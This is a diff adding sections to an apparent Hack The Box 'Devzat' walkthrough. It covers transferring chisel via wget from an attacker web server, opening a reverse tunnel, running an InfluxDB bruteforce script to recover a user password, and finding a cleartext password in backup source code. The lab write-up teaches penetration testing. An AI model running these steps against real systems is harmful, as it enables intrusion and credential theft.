@@ -438,10 +438,95 @@ We startby installing it:
 sudo apt install chisel
 `````
 
-...
+We then have to transfer it from Kali to *devzat*. To do so, we start a python web server on Kali (*sudo python -m SimpleHTTPServer*), and download it from *devzat* (*wget http://10.10.14.9:8000/chisel*). Finally, we make it executable with *chmod +x chisel*.
+
+Once it's installed, we open the tunnel on Kali:
+
+````
+sudo chisel server -p 9090 --reverse
+`````
+
+And "connect" to it from *devzat*:
+
+````
+./chisel client 10.10.14.9:9090 R:8086:127.0.0.1:8086
+`````
+
+Finally, we open another terminal window, and run the python script:
+
+````
+sudo python3 __main__.py
+`````
+
+
+<div class="img_container">
+![exploit]({{https://jsom1.github.io/}}/_images/htb_dz_exploit.png)
+</div>
+
+When we run the script, we're asked for host, port and wordlist. We can simply press enter for host and port (127.0.0.1 / 8086 by default), and I used */usr/share/dirb/wordlists/common.txt* for the wordlist). The scripts bruteforces usernames and detects if the host is vulnerable.\\
+Then, if it is vulnerable, it lists the available databases. We can connect to one of those and use InfluxQL (Influx query language) to query additional information:
+
+<div class="img_container">
+![exploit res]({{https://jsom1.github.io/}}/_images/htb_dz_res.png)
+</div>
+
+Warning: I spend a lot of time on InfluxQL syntax, because I had errors that seemed to be related to encoding. I was using *SELECT \* FROM user* (as in the image above) and got "*error parsing query: found \u00c2\u00a0, expected identifier, string, number, bool at line 1, char 7*". It turned out that it was because of my \*... I copied one I found on the web and pasted it in the command instead of typing it myself, and it worked.
+
+We see two "new" users, wilhelm and charles. What's really interesting though is that we find a password for Catherine. Let's try to switch to her account with it. From our SSH terminal as Patrick, we type:
+
+````
+su catherine
+`````
+And provide the discovered password. 
+
+<div class="img_container">
+![user flag]({{https://jsom1.github.io/}}/_images/htb_dz_usr.png)
+</div>
+
+That was painful, but we finally have the user flag!
 
 ## 4. Vertical privilege escalation
 {:style="color:DarkRed; font-size: 170%;"}
+
+The first thing I wanted to do was the usual *sudo -l* since we have catherine's password, however she isn't allowed to run sudo. Let's run *linpeas* once again (the box had been resetted and I had to reupload it. Catherine can't do it, so it is necessary to log back as patrick, upload it, and *su catherine*).\\
+I'm still pretty bad at privilege escalation and struggle to spot the interesting things in the output. I had to look for help and apparently, we have to look at writable files. Here's *linpeas*' output regarding them:
+
+<div class="img_container">
+![backups]({{https://jsom1.github.io/}}/_images/htb_dz_backups.png)
+</div>
+
+I didn't even pay attention to that because there's no color in the output... I usually first look at what's red, then yellow and green. Anyways, we see here 2 backups files foor *devzat*. We can't do much with them here, so let's copy them in a newly created */tmp/.backups* directory (we can't copy them in */.tmp* because we created this directory on patrick's account) and look at their content:
+
+````
+cd /var/backups/
+mkdir /tmp/.backups/
+cp *.zip /tmp/.backups/
+cd /tmp/.backups/
+`````
+
+And we can extract the files with *unzip devzat-dev.zip* and *unzip devzat-main.zip*. Let's focus on the dev version, more particularly on *dev/commands.go* (*dev/commands.go*). There, there's a promising looking function to read files, as well as a cleartext password:
+
+````
+func fileCommand(u *user, args []string) {
+        if len(args) < 1 {
+                u.system("Please provide file to print and the password")
+                return
+        }
+
+        if len(args) < 2 {
+                u.system("You need to provide the correct password to use this function")
+                return
+        }
+
+        path := args[0]
+        pass := args[1]
+
+        // Check my secure password
+        if pass != "CeilingCatStillAThingIn2021?" {
+                u.system("You did provide the wrong password")
+                return
+        }
+````
 
 
 
